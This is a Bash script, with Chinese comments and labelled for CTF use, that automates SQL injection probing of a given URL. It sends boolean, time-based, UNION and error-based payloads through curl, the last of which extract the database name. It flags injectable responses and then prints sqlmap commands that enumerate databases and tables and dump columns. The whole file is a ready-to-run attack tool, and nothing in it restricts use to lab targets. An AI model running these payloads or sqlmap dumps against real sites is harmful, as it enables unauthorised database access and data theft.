#!/bin/bash
# CTF SQL注入快速检测脚本
# 用法: ctf-sqli-test.sh <URL> <参数>

URL="$1"
PARAM="$2"

if [ -z "$URL" ] || [ -z "$PARAM" ]; then
    echo "用法: $0 <URL> <参数>"
    echo "示例: $0 'http://target/page?id=1' 'id'"
    exit 1
fi

echo "=========================================="
echo "SQL注入快速检测"
echo "URL: $URL"
echo "参数: $PARAM"
echo "=========================================="

echo ""
echo "[*] 原始响应..."
echo "------------------------------------------"
ORIG=$(curl -sk "$URL" 2>/dev/null)
ORIG_LEN=${#ORIG}
echo "原始长度: $ORIG_LEN"

echo ""
echo "[*] 单引号测试..."
echo "------------------------------------------"
RESP=$(curl -sk "${URL}'" 2>/dev/null | wc -c)
echo "单引号长度: $RESP"

echo ""
echo "[*] 常见注入Payload..."
echo "------------------------------------------"

PAYLOADS=(
    "1 AND 1=1"
    "1 AND 1=2"
    "1' AND '1'='1"
    "1' AND '1'='2"
    "1 OR 1=1"
    "1' OR '1'='1"
    "1 AND SLEEP(3)"
    "1' AND SLEEP(3)--"
    "1 UNION SELECT 1--"
    "1' UNION SELECT 1--"
    "1' AND 1=1--"
    "1' AND 1=2--"
    "1) AND 1=1--"
    "1) AND 1=2--"
)

for payload in "${PAYLOADS[@]}"; do
    encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))" 2>/dev/null)
    resp=$(curl -sk --max-time 5 "$URL$encoded" 2>/dev/null)
    resp_len=${#resp}
    
    if [ $resp_len -ne $ORIG_LEN ]; then
        echo "[!] 长度变化: $payload → $resp_len (原始: $ORIG_LEN)"
    fi
done

echo ""
echo "[*] 报错注入测试..."
echo "------------------------------------------"
ERROR_PAYLOADS=(
    "'"
    "\""
    "')"
    "'))"
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database())))--"
    "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT database())),1)--"
)

for payload in "${ERROR_PAYLOADS[@]}"; do
    encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))" 2>/dev/null)
    resp=$(curl -sk --max-time 5 "$URL$encoded" 2>/dev/null)
    
    if echo "$resp" | grep -qiE "(sql|syntax|error|mysql|oracle|postgresql|mssql|sqlite)"; then
        echo "[!] 发现SQL错误: $payload"
        echo "$resp" | grep -iE "(sql|syntax|error|mysql|oracle|postgresql|mssql|sqlite)" | head -3
    fi
done

echo ""
echo "[*] SQLMap快速测试..."
echo "------------------------------------------"
echo "如果发现注入点，运行以下命令深入测试:"
echo ""
echo "sqlmap -u \"$URL\" --batch --level=3 --risk=2"
echo "sqlmap -u \"$URL\" --batch --dbs"
echo "sqlmap -u \"$URL\" -D <db> --batch --tables"
echo "sqlmap -u \"$URL\" -D <db> -T <table> -C <column> --batch --dump"
echo ""

echo "=========================================="
echo "检测完成!"
echo "=========================================="
